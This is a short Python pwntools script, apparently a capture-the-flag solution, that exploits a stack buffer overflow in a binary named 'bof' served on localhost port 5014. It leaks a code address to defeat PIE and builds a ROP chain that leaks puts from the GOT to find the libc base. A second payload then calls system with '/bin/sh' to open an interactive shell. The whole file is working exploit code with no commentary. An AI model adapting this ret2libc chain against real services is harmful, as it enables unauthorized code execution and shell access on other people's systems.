from pwn import *

# r = process("./bof")
r = remote("localhost", 5014)
pause()

r.sendline("2")
r.sendline("17")
r.recvuntil("Value: ")
LEAK = int(r.recvline())
info(f"LEAK: {hex(LEAK)}")
BASE = LEAK - 0x1140
info(f"BASE: {hex(BASE)}")

PUTS_GOT = BASE + 0x3f98
PUTS_PLT = BASE + 0x10c0
POP_RDI_RET = BASE + 0x1453
RET = BASE + 0x101a
READ_ULL = BASE + 0x12d3

r.sendline("2")

PAYLOAD = b"A" * 40
PAYLOAD += p64(POP_RDI_RET)
PAYLOAD += p64(PUTS_GOT)
PAYLOAD += p64(PUTS_PLT)
PAYLOAD += p64(READ_ULL)
r.sendline(PAYLOAD)

PUTS_OFFSET = 0x875a0

r.recvuntil(b"Choice: ")
PUTS_LIBC = u64(r.recvline()[:-1].ljust(8, b"\x00"))
info(f"PUTS@LIBC: {hex(PUTS_LIBC)}")
LIBC_BASE = PUTS_LIBC - PUTS_OFFSET
info(f"LIBC_BASE: {hex(LIBC_BASE)}")

SYSTEM_OFFSET = 0x55410
BINSH_OFFSET = 0x1b75aa
SYSTEM_LIBC = LIBC_BASE + SYSTEM_OFFSET
BINSH_LIBC = LIBC_BASE + BINSH_OFFSET

PAYLOAD = b"A" * 40
PAYLOAD += p64(RET)
PAYLOAD += p64(POP_RDI_RET)
PAYLOAD += p64(BINSH_LIBC)
PAYLOAD += p64(SYSTEM_LIBC)

r.sendline(PAYLOAD)

r.interactive()
